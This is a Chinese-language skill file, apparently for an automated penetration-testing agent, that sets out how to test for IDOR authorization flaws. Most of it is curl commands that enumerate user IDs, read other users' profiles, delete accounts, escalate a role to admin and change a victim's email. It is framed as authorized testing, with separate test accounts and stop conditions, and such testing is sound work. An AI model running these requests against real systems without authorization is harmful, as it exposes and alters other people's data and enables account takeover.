---
name: idor
description: 检测不安全的直接对象引用（IDOR）漏洞，通过篡改对象标识符越权访问或修改其他用户的数据。
category: web
source: xalgorix
tags:
  - IDOR
  - 越权
  - 授权缺陷
  - OWASP Top 10
required_tools:
  - curl
  - ffuf
---

# IDOR 不安全的直接对象引用

## 适用场景

- 目标应用的 URL、API 或请求体中包含可预测的对象标识符（数字 ID、UUID、用户名等）。
- 需要验证用户 A 是否能访问/修改用户 B 的资源。
- 存在多角色用户系统，需要测试水平越权和垂直越权。

## 授权边界

- IDOR 测试需要至少两个不同权限级别的测试账号。
- **禁止修改其他真实用户的数据。** 如果必须验证写入类 IDOR，先创建测试数据。
- 批量枚举时控制请求速率，避免触发账户锁定或告警。

## 前置条件

- 至少两个测试账号（不同角色或不同用户）。
- 已通过 inventory 收集了 API 端点和参数列表。
- 可选：Burp Suite + Autorize 插件（用于自动化越权探测）。

## 执行步骤

### 步骤 1：识别对象引用

```bash
# 常见的对象引用位置
# URL 路径: /api/users/123, /orders/456
# 查询参数: ?user_id=123, ?doc=invoice_001
# POST body: {"user_id": 123, "order_ref": "ORD-2024"}
# HTTP 头: X-User-Id: 123
```

### 步骤 2：基线请求

用账号 A 访问自己的资源，保存完整请求和响应：

```bash
curl -s "https://<target>/api/users/100/profile" \
  -H "Authorization: Bearer <user_a_token>" \
  -o baseline_a.json
```

### 步骤 3：水平越权测试

用账号 A 的凭据访问账号 B 的资源：

```bash
# 尝试访问其他用户的资源
curl -s "https://<target>/api/users/101/profile" \
  -H "Authorization: Bearer <user_a_token>"

# 枚举 ID 范围
for id in $(seq 1 50); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/api/users/$id/profile" \
    -H "Authorization: Bearer <user_a_token>")
  [ "$code" != "403" ] && echo "ID $id: $code"
done
```

### 步骤 4：垂直越权测试

用普通用户凭据尝试管理操作：

```bash
# 尝试删除操作
curl -X DELETE "https://<target>/api/users/101" \
  -H "Authorization: Bearer <user_a_token>"

# 尝试修改角色
curl -X PUT "https://<target>/api/users/100" \
  -H "Authorization: Bearer <user_a_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

### 步骤 5：非明显位置的 IDOR

```bash
# GraphQL 查询中的 IDOR
curl -X POST "https://<target>/graphql" \
  -H "Authorization: Bearer <user_a_token>" \
  -d '{"query":"{ user(id: 101) { email phone } }"}'

# 批量操作中的 IDOR
curl -X POST "https://<target>/api/bulk-delete" \
  -H "Authorization: Bearer <user_a_token>" \
  -d '{"ids": [101, 102, 103]}'
```

### 步骤 6：影响升级

如果只读 IDOR 确认，尝试升级为写入类操作：

```bash
# 如果可读取他人数据，尝试修改
curl -X PATCH "https://<target>/api/users/101" \
  -H "Authorization: Bearer <user_a_token>" \
  -d '{"email": "attacker@example.com"}'
```

## 停止条件

- 确认可修改其他用户数据时，记录即可，**不要实际修改真实用户数据**。
- 批量枚举触发 429 速率限制时暂停。
- 发现可以访问管理员功能或敏感数据（PII）时，停止深入并报告主代理。

## 输出格式

- 存在 IDOR 的端点和方法。
- 可访问的其他用户对象数量（枚举范围）。
- 授权缺陷类型（水平 / 垂直 / 读写）。
- 受影响的数据类型（PII、订单、文档等）。

## 验收标准

1. 对所有包含对象引用的端点进行了 IDOR 探测。
2. 至少测试了数字 ID 枚举和 UUID/用户名篡改。
3. 测试了至少 2 种 HTTP 方法（GET + PUT/PATCH/DELETE）。
4. 如有 GraphQL 端点，进行了相应 IDOR 测试。
